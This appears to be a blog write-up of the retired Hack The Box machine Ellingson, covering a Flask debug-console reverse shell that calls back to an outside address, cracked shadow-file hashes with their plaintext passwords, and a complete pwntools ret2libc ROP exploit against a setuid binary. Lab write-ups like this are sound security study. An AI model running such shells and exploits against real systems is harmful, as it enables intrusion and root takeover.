---
layout: post
title: HTB - Ellingson
date: 2025-03-25 08:53 -0400
---

{{ 'ellingson' | get_machine_avatar | raw }}

# nmap

```bash
~/workspace/projects/htb/retired_machines/ellingson » ~/dotfiles/htb/nmap.sh $(cat ip.txt) | tee nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-05 12:10 -04
Nmap scan report for 10.10.10.139
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49e8f12a8062de7e0240a1f430d288a6 (RSA)
|   256 c802cfa0f2d85d4f7dc7660b4d5d0bdf (ECDSA)
|_  256 a5a995f54af4aef8b63792b89a2ab466 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-05 12:11 -04
```

- no .git
- no robots.txt
- default nginx page 404

## main website
flask debug mode is active `http://10.10.10.139/articles/'`. So we get a shell pretty easily.
![flask debug](/assets/img/ellingson1.png)
```python
import subprocess; subprocess.check_output("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'", shell=True)
```

## priv esc

There are 3 more users with shells
```bash
theplague:x:1000:1000:Eugene Belford:/home/theplague:/bin/bash
hal:x:1001:1001:,,,:/home/hal:/bin/bash
margo:x:1002:1002:,,,:/home/margo:/bin/bash
duke:x:1003:1003:,,,:/home/duke:/bin/bash
```

Doesn't look like its running on docker. port 8888 is the flask server. 80 is probably the next step.
```bash
hal@ellingson:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1349/python3
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

weird suid binary called `garbage`, gives an unauthorized message
![unauthorized](/assets/img/ellingson2.png)

`/var/backups/shadow.bak` looks interesting.

```bash
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

cracking with `hashcat -a 0 ./hash.txt ~/wordlists/rockyou.txt -m 1800` gives:

```bash
theplague::password123
margo:iamgod$08
```

## priv esc 2

margo gives the user flag:
```bash
margo@ellingson:~$ cat user.txt
80215***************************
```

Now we get a password prompt when using the `garbage` binary.
![password prompt](/assets/img/ellingson4.png)

Reversing it shows the password: `N3veRF3@r1iSh3r3!`. Doesn't work in any of the other users. There is also a buffer overflow on the prompt with `gets`.
![hardcoded password](/assets/img/ellingson3.png)

I'm not very good at this but I have an idea of what to do.
- leak libc
- rop chain
- call system

For leaking libc we have a `print_hex` function, we overwrite the return value and then the next func gets leaked?

It's way simpler actually, we just use a pointer from the `got` table and print it with `puts` or with `print_hex`. I forgot that `puts` and `printf` take a pointer and was trying to pass actual values to it.

```python
#!/usr/bin/env python3

from pwn import *

context(os = 'linux', arch = 'amd64')
libc = ELF("./libc.so.6", checksec=False)
elf = ELF(
    "./garbage",
    checksec=False,
)

context.binary = elf
context.log_level = 'debug'

def pad(char, qt):
    return char.encode() * qt

def pop_rdi(data):
    # 0x000000000040179b : pop rdi ; ret
    return p64(0x0040179b) + data

def pop_rbp(data):
    return p64(0x00401239) + data

def pop_rsi(data):
     # : pop rsi ; pop r15 ; ret
    return p64(0x00401799) + data + (b"\x00"*8)

def pop_rsp(data):
    # 0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    return p64(0x00401795) + data + (b"\x00"*8) + (b"\x00"*8) + (b"\x00"*8)

def add_rsp8():
    return p64(0x0000000000401012)

payload = (
    pad("A", 136)
    + pop_rdi(b"")
    + p64(elf.got['puts'])
    + p64(elf.symbols['puts'])
    + p64(elf.symbols['main'])
)

shell = ssh(user='margo', host='10.10.10.139', password='iamgod$08')
p = shell.run("/bin/bash")
p.sendline("/usr/bin/garbage")

p.recvuntil(b"password:")
p.sendline(payload)
p.recvuntil(b"denied.\n")

leaked_puts = u64(p.recv()[0:6] + b"\x00\x00")
libc_base = leaked_puts - libc.symbols["puts"]
libc.address = libc_base

rop = ROP([libc])
rop.setuid(0x0)
rop.system(next(libc.search(b'/bin/sh\x00')))

p.sendline(pad("A", 136) + rop.chain())
p.recvuntil(b"denied.\n")
p.interactive()
```

```bash
$ cat /root/root.txt
370e2***************************
```
